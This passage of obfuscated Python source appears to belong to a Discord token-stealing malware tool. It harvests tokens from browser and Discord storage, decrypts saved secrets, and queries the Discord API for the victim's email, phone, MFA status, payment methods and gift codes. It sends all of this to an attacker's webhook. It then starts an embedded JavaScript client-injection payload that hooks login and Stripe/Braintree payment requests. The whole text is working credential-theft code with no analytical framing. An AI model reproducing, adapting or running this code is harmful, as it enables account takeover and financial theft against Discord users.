        if os.path.exists(RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC + "\\Mozilla\\Firefox\\Profiles"):
            for KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG, _, v4r_files in os.walk(RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC + "\\Mozilla\\Firefox\\Profiles"):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(f'{KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG}\\{v4r__file}', errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT in re.findall(KKUOQDLCVOZKTEVUJFXLUKPEGWDBNJEMHGYVYBNBWBWEDLHNFOGYRZRWYTQEVXELRTVHVZRPIISLM, v4r_line.strip()):
                                    if CYHJQLRZHPRZLNDAKCSAWWLQSLAIOVXXIKIYRWJERNFNPUFHVNPATSOLNUWIHUXDWC(OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT, NTHERRZOBQDSQSBSOLBKEUHJHVQOHYPMTEFSPSQQIKBJEYZQWLHGMOJHHSRDDTEECYSHVZTN):
                                        NWIZABILPRIQCTYRLOAHQZITQTYSLIYBNFAIJOMKBSXHPDRRDQFUQALVAWVMZPCCMVXRHZT = requests.get(NTHERRZOBQDSQSBSOLBKEUHJHVQOHYPMTEFSPSQQIKBJEYZQWLHGMOJHHSRDDTEECYSHVZTN, headers={'Authorization': OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT}).json()['id']
                                        if NWIZABILPRIQCTYRLOAHQZITQTYSLIYBNFAIJOMKBSXHPDRRDQFUQALVAWVMZPCCMVXRHZT not in CVUOCCSXFTVUCKFCINCGTDGWMZWRSOZWEZCZUHYKXWPFTEINURRUDQPNFQL:
                                            TEZWMHFXKOEFYCBXLNCSHAXEDHNZHUWXRPJRDPJRGOLPYVLUVIBHMCDEELEGJ.append(OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT)
                                            CVUOCCSXFTVUCKFCINCGTDGWMZWRSOZWEZCZUHYKXWPFTEINURRUDQPNFQL.append(NWIZABILPRIQCTYRLOAHQZITQTYSLIYBNFAIJOMKBSXHPDRRDQFUQALVAWVMZPCCMVXRHZT)
                                            XWGIHVZCIKPLANKQPULGLHZVRRJSRJJKZBUYUPHNGULBPSNLJLLBQRAAAOEJDFVJKAJDIYTYYCCI[OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT] = ('Firefox', f"{KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG}\\{v4r__file}")
        return TEZWMHFXKOEFYCBXLNCSHAXEDHNZHUWXRPJRDPJRGOLPYVLUVIBHMCDEELEGJ, XWGIHVZCIKPLANKQPULGLHZVRRJSRJJKZBUYUPHNGULBPSNLJLLBQRAAAOEJDFVJKAJDIYTYYCCI

    def CYHJQLRZHPRZLNDAKCSAWWLQSLAIOVXXIKIYRWJERNFNPUFHVNPATSOLNUWIHUXDWC(OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT, NTHERRZOBQDSQSBSOLBKEUHJHVQOHYPMTEFSPSQQIKBJEYZQWLHGMOJHHSRDDTEECYSHVZTN):
        return requests.get(NTHERRZOBQDSQSBSOLBKEUHJHVQOHYPMTEFSPSQQIKBJEYZQWLHGMOJHHSRDDTEECYSHVZTN, headers={'Authorization': OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT}).status_code == 200

    def TGYKZECNBVJZAILOPKUJHIMVDBDAINBIHQUUXEFBZAMXWGYFUDWNVIBHMUEBRYSCLLZVVQVal(ZJPAVQSSZXXNHAAJAKISAQNQKMFUHCPCXNNZFQUZGUSOZYQJQXCEITCNOWYRAJX, WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY):
        LXVSESYBORVBEIEVWTPNEQVDAUSQCYCTWXUTKUYDJTPZGKMBFOOKDCEQKIGQTUMNFQEKOEKRBMEAXUWEHY = ZJPAVQSSZXXNHAAJAKISAQNQKMFUHCPCXNNZFQUZGUSOZYQJQXCEITCNOWYRAJX[3:15]
        YBCBAOTCNQIHMHQACWQQRFAVLFOUUSMLOPRWSUQGVCULREANJBFJQXOLVIDVEOKVPWK = ZJPAVQSSZXXNHAAJAKISAQNQKMFUHCPCXNNZFQUZGUSOZYQJQXCEITCNOWYRAJX[15:]
        DMNKXXSPDOWRNGHBAKWMDXLGYZYZHYLRTJVUGFAVYPLXNMJHVGNSDIIFUKSJYPSJXFZUSIWCLDSNYEVWAH = AES.new(WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY, AES.MODE_GCM, LXVSESYBORVBEIEVWTPNEQVDAUSQCYCTWXUTKUYDJTPZGKMBFOOKDCEQKIGQTUMNFQEKOEKRBMEAXUWEHY)
        return DMNKXXSPDOWRNGHBAKWMDXLGYZYZHYLRTJVUGFAVYPLXNMJHVGNSDIIFUKSJYPSJXFZUSIWCLDSNYEVWAH.decrypt(YBCBAOTCNQIHMHQACWQQRFAVLFOUUSMLOPRWSUQGVCULREANJBFJQXOLVIDVEOKVPWK)[:-16].decode()

    def HURBTAYTSDEFJYYWXRIPCZDAFHUUVPWRWWCJBUMWDNCRQXPNWMWRLBOSNDVOPJWNCFVQLABADMZJROMTNNHSZIBFKWYAM(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG):
        if not os.path.exists(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG):
            return None
        with open(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG, "r", encoding="utf-8") as v4r_f:
            HTAIZVRUBUTLOPKSZSHZDKVXHORNMBGRIEJQNZYQZAJTNVXRIOXIXOFUUXDTUHTISKFFEMLALIXMSWZEAKUXFBKPZPRPXKPYGOH = json.load(v4r_f)
        WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY = base64.b64decode(HTAIZVRUBUTLOPKSZSHZDKVXHORNMBGRIEJQNZYQZAJTNVXRIOXIXOFUUXDTUHTISKFFEMLALIXMSWZEAKUXFBKPZPRPXKPYGOH["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY, None, None, None, 0)[1]

    TEZWMHFXKOEFYCBXLNCSHAXEDHNZHUWXRPJRDPJRGOLPYVLUVIBHMCDEELEGJ, XWGIHVZCIKPLANKQPULGLHZVRRJSRJJKZBUYUPHNGULBPSNLJLLBQRAAAOEJDFVJKAJDIYTYYCCI = LBQWYKOYRCWXQLCGFMZUPPRBITRMGXFLUIZPVGRAIZARPWBLCRHFWDQWSMDECSUIGAFTPUQOAOJZJ()
    JWVLJMCFQSTQUEOJCKJMLOUKYFDWBBBBVFVMVAEYUGEVBMMGAFOXGPADLVGDXVY = SyncWebhook.from_url(IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY)

    if not TEZWMHFXKOEFYCBXLNCSHAXEDHNZHUWXRPJRDPJRGOLPYVLUVIBHMCDEELEGJ:
        HVWTOFJWUIDZCVSAYHAFXOPZPUOCIRDLPLRZNNVAUDMOMZRYMDBOEQLNDFNZTYTQFDIXRV(
            IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY, 
            title=f'Discord Token {JHLULHJAEVOGMHLPODOFLTMZEVLWMTKSCFIIIYITMFTBTRBCDAEKUGAIRGRUUXB}:', 
            description=f"No discord tokens found."
        )
        return
    
    for OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT_d15c0rd in TEZWMHFXKOEFYCBXLNCSHAXEDHNZHUWXRPJRDPJRGOLPYVLUVIBHMCDEELEGJ:
        RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT_d15c0rd}).json()

        OOWSGQCXUOUHDMFDZYWNFQELXEZHZPIWEYNNALOLLISLOIEFYUQLVAWFBJWISACFJMSXGOHTGLTARGNUEDVPMXLXEZW = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('username', "None") + '#' + RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('discriminator', "None")
        VUXIMTTERESVPPQOMUDGHSGIJWEWVUUEGYBAUPIUOOQBKSBVWMFABNMVLPBXQYVZZFBQWTEALBFZXTTMSBVOPOZMVUVQANMUD = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('global_name', "None")
        WHJVGSLOLAGRQWFHGFQYFGDAYAMREFBGGVMSXXXPZBKOMCOQIODQYLPDGH = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('id', "None")
        VAFFKJDEQGLMQFGKAEARFFPASATFGTPZECTIEDYHYDFUHAJKKQTPBPEBDINNNQWQWZUMOOXCQQNBFOWMRDNWHMX = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('email', "None")
        EKHOROAHRRPVRROMAOSEBKNROFRIWHBQLUNMUZCTRXHCNJDPOSM = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('verified', "None")
        LMEZWLACVNVYOTDJYIWMAGHZMIATYUNRZVCBCGJBGKRGARNKIKHMNABVDRCLOCUQCHJKHHIJUVEEBDHEWVKL = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('phone', "None")
        GFAOVVSOLIOZALUWPKQFLEBCWGCFQWAZYEBPXFJYHMLTZKFOHJKLKKYYPELEGK = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('locale', "None")
        GSXDWFGRVFVAXKRFFQYVZUYDZHICOYCPUEPJELKVYNMVIWZOKQCYEBIGCIXHUJWV = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('mfa_enabled', "None")

        try:
            if RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('premium_type', 'None') == 0:
                WVDELSWTHEJCBUMKWQAKQDQVMHRILGUIKVFUXQAMOJIZWQITVXTAVTSIUXDWOUFUVNZSHLSOLOZTBSWAAO = 'False'
            elif RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('premium_type', 'None') == 1:
                WVDELSWTHEJCBUMKWQAKQDQVMHRILGUIKVFUXQAMOJIZWQITVXTAVTSIUXDWOUFUVNZSHLSOLOZTBSWAAO = 'Nitro Classic'
            elif RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('premium_type', 'None') == 2:
                WVDELSWTHEJCBUMKWQAKQDQVMHRILGUIKVFUXQAMOJIZWQITVXTAVTSIUXDWOUFUVNZSHLSOLOZTBSWAAO = 'Nitro Boosts'
            elif RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('premium_type', 'None') == 3:
                WVDELSWTHEJCBUMKWQAKQDQVMHRILGUIKVFUXQAMOJIZWQITVXTAVTSIUXDWOUFUVNZSHLSOLOZTBSWAAO = 'Nitro Basic'
            else:
                WVDELSWTHEJCBUMKWQAKQDQVMHRILGUIKVFUXQAMOJIZWQITVXTAVTSIUXDWOUFUVNZSHLSOLOZTBSWAAO = 'False'
        except:
            WVDELSWTHEJCBUMKWQAKQDQVMHRILGUIKVFUXQAMOJIZWQITVXTAVTSIUXDWOUFUVNZSHLSOLOZTBSWAAO = "None"

        try: 
            PGGILELCJXECWBMQCUZPJNLJJSFILOECCFBVVXWKPDFBHWUBNYCGZGWDBCNAIRYPO = f"https://cdn.discordapp.com/avatars/{WHJVGSLOLAGRQWFHGFQYFGDAYAMREFBGGVMSXXXPZBKOMCOQIODQYLPDGH}/{RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{WHJVGSLOLAGRQWFHGFQYFGDAYAMREFBGGVMSXXXPZBKOMCOQIODQYLPDGH}/{RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{WHJVGSLOLAGRQWFHGFQYFGDAYAMREFBGGVMSXXXPZBKOMCOQIODQYLPDGH}/{RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT['avatar']}.png"
        except: 
            PGGILELCJXECWBMQCUZPJNLJJSFILOECCFBVVXWKPDFBHWUBNYCGZGWDBCNAIRYPO = PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA

        try:
            QUYHQAXROFBUGTQCEYWUFYNNPHHHFDQYWYGRHQSOHPKJWBWFYWYKQENXCFAOHV = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT_d15c0rd}).json()
            if QUYHQAXROFBUGTQCEYWUFYNNPHHHFDQYWYGRHQSOHPKJWBWFYWYKQENXCFAOHV:
                RDQMXIPBROESKHVCQMUGNLLMMOTIZWPCBFREAPMYWPUEUJRMOUPLHOCLNDECLDNWQWPANIKEKSUFRQJ = []

                for v4r_method in QUYHQAXROFBUGTQCEYWUFYNNPHHHFDQYWYGRHQSOHPKJWBWFYWYKQENXCFAOHV:
                    if v4r_method['type'] == 1:
                        RDQMXIPBROESKHVCQMUGNLLMMOTIZWPCBFREAPMYWPUEUJRMOUPLHOCLNDECLDNWQWPANIKEKSUFRQJ.append('CB')
                    elif v4r_method['type'] == 2:
                        RDQMXIPBROESKHVCQMUGNLLMMOTIZWPCBFREAPMYWPUEUJRMOUPLHOCLNDECLDNWQWPANIKEKSUFRQJ.append("Paypal")
                    else:
                        RDQMXIPBROESKHVCQMUGNLLMMOTIZWPCBFREAPMYWPUEUJRMOUPLHOCLNDECLDNWQWPANIKEKSUFRQJ.append('Other')
                RDQMXIPBROESKHVCQMUGNLLMMOTIZWPCBFREAPMYWPUEUJRMOUPLHOCLNDECLDNWQWPANIKEKSUFRQJ = ' / '.join(RDQMXIPBROESKHVCQMUGNLLMMOTIZWPCBFREAPMYWPUEUJRMOUPLHOCLNDECLDNWQWPANIKEKSUFRQJ)
            else:
                RDQMXIPBROESKHVCQMUGNLLMMOTIZWPCBFREAPMYWPUEUJRMOUPLHOCLNDECLDNWQWPANIKEKSUFRQJ = "None"
        except:
            RDQMXIPBROESKHVCQMUGNLLMMOTIZWPCBFREAPMYWPUEUJRMOUPLHOCLNDECLDNWQWPANIKEKSUFRQJ = "None"

        try:
            XALXOWTWIBWXQVFQHFONTMSWHNILHVMPAORSIDOENBFQPLWIRGOZEHFYTLMDAZNADMLLJPNCOBRASOAEEKPNNZI = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT_d15c0rd}).json()
            if XALXOWTWIBWXQVFQHFONTMSWHNILHVMPAORSIDOENBFQPLWIRGOZEHFYTLMDAZNADMLLJPNCOBRASOAEEKPNNZI:
                ASRIDRWPESALQZPIIQZGKVVTBRZEKRGAIAHYXMJARTRFLYADODJBJYNWOSE = []
                for LYREYDMDTOAHFDWDPCEIEDPKNAZEGAFSXIGMJGLOZIWXBRESPPEKFVGLPXDAARKJMBZZUEVJUHXFK in XALXOWTWIBWXQVFQHFONTMSWHNILHVMPAORSIDOENBFQPLWIRGOZEHFYTLMDAZNADMLLJPNCOBRASOAEEKPNNZI:
                    JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT = LYREYDMDTOAHFDWDPCEIEDPKNAZEGAFSXIGMJGLOZIWXBRESPPEKFVGLPXDAARKJMBZZUEVJUHXFK['promotion']['outbound_title']
                    LYREYDMDTOAHFDWDPCEIEDPKNAZEGAFSXIGMJGLOZIWXBRESPPEKFVGLPXDAARKJMBZZUEVJUHXFK = LYREYDMDTOAHFDWDPCEIEDPKNAZEGAFSXIGMJGLOZIWXBRESPPEKFVGLPXDAARKJMBZZUEVJUHXFK['code']
                    HWEMJWVPMIHQIIKFQBPWJQNOEMVHHKDKQNNKCMGJSIYACVWBWHHFDFZO = f"Gift: {JHNRJANLHAFFOULYGIOVJYZMPRIYAHKHCEOTFVBFPMKVCRNQJIPZOZEPYUMUOASXPDDT}\nCode: {LYREYDMDTOAHFDWDPCEIEDPKNAZEGAFSXIGMJGLOZIWXBRESPPEKFVGLPXDAARKJMBZZUEVJUHXFK}"
                    if len('\n\n'.join(LYREYDMDTOAHFDWDPCEIEDPKNAZEGAFSXIGMJGLOZIWXBRESPPEKFVGLPXDAARKJMBZZUEVJUHXFK)) + len(HWEMJWVPMIHQIIKFQBPWJQNOEMVHHKDKQNNKCMGJSIYACVWBWHHFDFZO) >= 1024:
                        break
                    ASRIDRWPESALQZPIIQZGKVVTBRZEKRGAIAHYXMJARTRFLYADODJBJYNWOSE.append(HWEMJWVPMIHQIIKFQBPWJQNOEMVHHKDKQNNKCMGJSIYACVWBWHHFDFZO)
                if len(ASRIDRWPESALQZPIIQZGKVVTBRZEKRGAIAHYXMJARTRFLYADODJBJYNWOSE) > 0:
                    LYREYDMDTOAHFDWDPCEIEDPKNAZEGAFSXIGMJGLOZIWXBRESPPEKFVGLPXDAARKJMBZZUEVJUHXFK = '\n\n'.join(ASRIDRWPESALQZPIIQZGKVVTBRZEKRGAIAHYXMJARTRFLYADODJBJYNWOSE)
                else:
                    LYREYDMDTOAHFDWDPCEIEDPKNAZEGAFSXIGMJGLOZIWXBRESPPEKFVGLPXDAARKJMBZZUEVJUHXFK = "None"
            else:
                LYREYDMDTOAHFDWDPCEIEDPKNAZEGAFSXIGMJGLOZIWXBRESPPEKFVGLPXDAARKJMBZZUEVJUHXFK = "None"
        except:
            LYREYDMDTOAHFDWDPCEIEDPKNAZEGAFSXIGMJGLOZIWXBRESPPEKFVGLPXDAARKJMBZZUEVJUHXFK = "None"
    
        v4r_software_name, KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG = XWGIHVZCIKPLANKQPULGLHZVRRJSRJJKZBUYUPHNGULBPSNLJLLBQRAAAOEJDFVJKAJDIYTYYCCI.get(OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT_d15c0rd, ("Unknown Software", "Unknown location"))

        embed = Embed(title=f'Discord Token {JHLULHJAEVOGMHLPODOFLTMZEVLWMTKSCFIIIYITMFTBTRBCDAEKUGAIRGRUUXB}:', color=UTZBJCXIIXIRRNPGPVMVRAUQFHGPHNUXVZTCTFTBZDDPJAHSGQYQPDZEVSBBUHQHXDWLOFYAYJQXNWTPXQXX)      
        embed.add_field(name=":file_folder: Path:", value=f"```{KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG}```", inline=True)
        embed.add_field(name=":globe_with_meridians: Token:", value=f"```{OGZBMMLIYLNEIHMRJHUFCJDOKLGDDNOVXNMYWGRWOHCJOFWFHLGHWOZRUMUOGBSCPASALQINDPUAQBYLARFPPT_d15c0rd}```", inline=True)
        embed.add_field(name=":package: Software:", value=f"```{v4r_software_name}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{OOWSGQCXUOUHDMFDZYWNFQELXEZHZPIWEYNNALOLLISLOIEFYUQLVAWFBJWISACFJMSXGOHTGLTARGNUEDVPMXLXEZW}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{VUXIMTTERESVPPQOMUDGHSGIJWEWVUUEGYBAUPIUOOQBKSBVWMFABNMVLPBXQYVZZFBQWTEALBFZXTTMSBVOPOZMVUVQANMUD}```", inline=True)
        embed.add_field(name=":robot: Id:", value=f"```{WHJVGSLOLAGRQWFHGFQYFGDAYAMREFBGGVMSXXXPZBKOMCOQIODQYLPDGH}```", inline=True)
        embed.add_field(name=":e_mail: Email:", value=f"```{VAFFKJDEQGLMQFGKAEARFFPASATFGTPZECTIEDYHYDFUHAJKKQTPBPEBDINNNQWQWZUMOOXCQQNBFOWMRDNWHMX}```", inline=True)
        embed.add_field(name=":white_check_mark: Email Verified:", value=f"```{EKHOROAHRRPVRROMAOSEBKNROFRIWHBQLUNMUZCTRXHCNJDPOSM}```", inline=True)
        embed.add_field(name=":telephone_receiver: Phone:", value=f"```{LMEZWLACVNVYOTDJYIWMAGHZMIATYUNRZVCBCGJBGKRGARNKIKHMNABVDRCLOCUQCHJKHHIJUVEEBDHEWVKL}```", inline=True)   
        embed.add_field(name=":rocket: Nitro:", value=f"```{WVDELSWTHEJCBUMKWQAKQDQVMHRILGUIKVFUXQAMOJIZWQITVXTAVTSIUXDWOUFUVNZSHLSOLOZTBSWAAO}```", inline=True)
        embed.add_field(name=":earth_africa: Language:", value=f"```{GFAOVVSOLIOZALUWPKQFLEBCWGCFQWAZYEBPXFJYHMLTZKFOHJKLKKYYPELEGK}```", inline=True)
        embed.add_field(name=":moneybag: Billing:", value=f"```{RDQMXIPBROESKHVCQMUGNLLMMOTIZWPCBFREAPMYWPUEUJRMOUPLHOCLNDECLDNWQWPANIKEKSUFRQJ}```", inline=True)
        embed.add_field(name=":gift: Gift Code:", value=f"```{LYREYDMDTOAHFDWDPCEIEDPKNAZEGAFSXIGMJGLOZIWXBRESPPEKFVGLPXDAARKJMBZZUEVJUHXFK}```", inline=True)
        embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{GSXDWFGRVFVAXKRFFQYVZUYDZHICOYCPUEPJELKVYNMVIWZOKQCYEBIGCIXHUJWV}```", inline=True)
        embed.add_field(name=":frame_photo: Profile Picture:", value=f"", inline=False)
        embed.set_image(url=PGGILELCJXECWBMQCUZPJNLJJSFILOECCFBVVXWKPDFBHWUBNYCGZGWDBCNAIRYPO)
        embed.set_footer(text=KYTKOBRBQHILSBXLLMVIIDOTMYLCMSODXPFYUYELALJDSKOABUSDKRXMDY, icon_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA)
        JWVLJMCFQSTQUEOJCKJMLOUKYFDWBBBBVFVMVAEYUGEVBMMGAFOXGPADLVGDXVY.send(embed=embed, username=XDRDKLTFJIUFNEAZDALYFMCUQBIDKCEPGTOWNANQZULRCHMPYJVSYNO, avatar_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA)

GHKCQJWURWOPLUVEGUILWYBDRJKNNMTTMWWUONTTIYKDVQAPSMYNBQEMSAJMPABXTZVAQEPZHEBHU = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

